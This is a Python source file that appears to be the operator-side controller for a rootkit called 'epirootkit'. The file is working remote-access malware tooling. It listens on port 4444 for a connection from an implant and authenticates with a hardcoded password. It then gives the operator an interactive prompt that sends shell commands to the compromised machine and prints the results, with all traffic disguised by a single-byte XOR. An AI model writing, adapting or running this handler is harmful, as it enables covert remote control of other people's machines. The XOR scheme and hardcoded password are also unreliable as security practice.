import argparse
import socket
import logging
import sys

XOR_KEY = 0x2A
EOF_MARKER = "--EOF--"
PASSWORD = "secret"


def xor_encrypt_decrypt(data: bytes) -> bytes:
    return bytes(b ^ XOR_KEY for b in data)


def recv_until_eof(sock: socket.socket) -> str:
    buffer = b""
    while True:
        chunk = sock.recv(1024)
        if not chunk:
            break
        decrypted = xor_encrypt_decrypt(chunk)
        buffer += decrypted
        if EOF_MARKER.encode() in decrypted:
            break
    return buffer.decode(errors="ignore").replace(EOF_MARKER, "")


def authenticate(sock: socket.socket) -> bool:
    encrypted_pw = xor_encrypt_decrypt(PASSWORD.encode())
    sock.sendall(encrypted_pw)
    response = xor_encrypt_decrypt(sock.recv(16)).decode(errors="ignore")
    return response.strip() == "OK"


def interactive_session(sock: socket.socket):
    try:
        while True:
            cmd = input("epirootkit> ").strip()
            if not cmd:
                continue
            sock.sendall(xor_encrypt_decrypt(cmd.encode()))
            if cmd in ("exit", "quit"):
                break
            output = recv_until_eof(sock)
            print(output, end="")
    except (KeyboardInterrupt, EOFError):
        print("\n[!] Interrupted. Exiting.")
        try:
            sock.sendall(xor_encrypt_decrypt(b"exit"))
        except:
            pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=4444)
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((args.host, args.port))
        server.listen(1)
        logging.info(f"Listening on {args.host}:{args.port}...")

        while True:
            conn, addr = server.accept()
            logging.info(f"Connection from {addr[0]}:{addr[1]}")
            try:
                if authenticate(conn):
                    logging.info("Authentication successful.")
                    interactive_session(conn)
                else:
                    logging.warning("Authentication failed.")
            finally:
                conn.close()
                logging.info("Connection closed.")


if __name__ == "__main__":
    main()
